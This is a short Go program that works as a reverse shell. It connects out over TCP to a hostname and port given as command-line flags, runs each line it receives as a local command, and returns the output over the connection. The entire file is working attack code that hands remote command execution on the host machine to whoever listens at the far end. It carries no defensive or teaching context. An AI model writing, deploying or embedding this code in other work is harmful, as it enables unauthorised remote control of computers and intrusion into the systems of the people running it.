package main

import (
	"bufio"
	"flag"
	"fmt"
	"net"
	"os/exec"
	"strings"
)

func reverse(host string) {
	conn, _ := net.Dial("tcp", host)
	for {
		message, _ := bufio.NewReader(conn).ReadString('\n')
		out, err := exec.Command(strings.TrimSuffix(message, "\n")).Output()

		if err != nil {
			fmt.Fprintf(conn, "%s\n",err)
		}
		fmt.Fprintf(conn, "%s\n",out)
	}
}

func main(){
	var hostname string
	portPtr := flag.Int("port",0,"host port")
	flag.StringVar(&hostname,"hostname","","host to communicate")
	flag.Parse()
	connection_server := fmt.Sprintf("%s:%d",hostname,*portPtr)
	reverse(connection_server)
}

